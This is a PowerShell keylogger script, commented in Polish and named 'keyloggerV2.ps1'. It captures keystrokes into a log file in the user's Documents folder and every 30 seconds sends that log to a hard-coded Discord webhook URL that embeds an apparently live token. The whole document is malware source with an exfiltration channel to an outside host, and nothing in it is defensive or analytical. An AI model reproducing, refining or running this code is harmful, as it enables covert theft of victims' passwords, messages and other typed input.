Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# Komunikat, który mówi, że skrypt się załadował
Write-Host "Skrypt keyloggerV2.ps1 uruchomiony!"

# Ścieżka do pliku logu
$logPath = "$env:USERPROFILE\Documents\keylogger.txt"
$webhook = "https://discord.com/api/webhooks/1360942823821803540/9I6AgpJboKwPSgnCIfbxFshdEwhYTyOHrlYrNlnY-UkJvc1SjTyAtEu-8-KEyWv3iCuU"

# Zmienna globalna do logowania klawiszy
$global:loggedKeys = ""

# Funkcja zapisu logów
function Save-Log {
    try {
        Write-Host "Zapisuję logi do pliku: $logPath"
        if (-not (Test-Path $logPath)) {
            Write-Host "Plik logu nie istnieje, tworzę..."
        }
        $global:loggedKeys | Out-File -Append -Encoding UTF8 -FilePath $logPath
        $global:loggedKeys = ""
    } catch {
        Write-Host "Błąd zapisu logów: $_"
    }
}

# Funkcja wysyłania logów na Discorda
function Send-To-Discord {
    if (Test-Path $logPath) {
        $content = Get-Content $logPath -Raw
        if ($content.Trim().Length -gt 0) {
            $maxLen = 1900
            if ($content.Length -gt $maxLen) {
                $content = $content.Substring(0, $maxLen) + "`n[...]"
            }

            # Poprawiona definicja payload w HashTable
            $payload = @{
                "content" = "📝 **Keylogger log:**`n```\n$content\n```"
            }

            # Konwertowanie na JSON
            $payloadJson = $payload | ConvertTo-Json -Depth 10

            try {
                Write-Host "Wysyłam logi na Discorda..."
                Invoke-RestMethod -Uri $webhook -Method Post -Body $payloadJson -ContentType 'application/json'
                Clear-Content -Path $logPath
            } catch {
                Write-Host "❌ Błąd wysyłania na Discorda: $_"
            }
        }
    }
}

# Timer do wysyłania logów co 30s
$sendTimer = New-Object System.Timers.Timer
$sendTimer.Interval = 30000
$sendTimer.AutoReset = $true
$sendTimer.add_Elapsed({ Send-To-Discord })
$sendTimer.Start()

# Rejestracja klawiszy
$null = Register-ObjectEvent -InputObject [System.Windows.Forms.Control]::new() -EventName KeyDown -Action {
    param($sender, $e)
    $key = $e.KeyCode.ToString()
    if ($e.Control -and $e.KeyCode -eq "C") { $key = "[Ctrl+C]" }
    $global:loggedKeys += $key + " "
    if ($global:loggedKeys.Length -gt 50) {
        Save-Log
    }
}

# Główny timer zamykający skrypt po 5 minutach
$shutdownTimer = New-Object System.Timers.Timer
$shutdownTimer.Interval = 300000  # 5 minut = 300 000 ms
$shutdownTimer.AutoReset = $false
$shutdownTimer.add_Elapsed({
    Save-Log
    Send-To-Discord
    $sendTimer.Stop()
    $shutdownTimer.Stop()
})
$shutdownTimer.Start()

# Czekaj na zdarzenia
while ($true) { Start-Sleep -Seconds 1 }
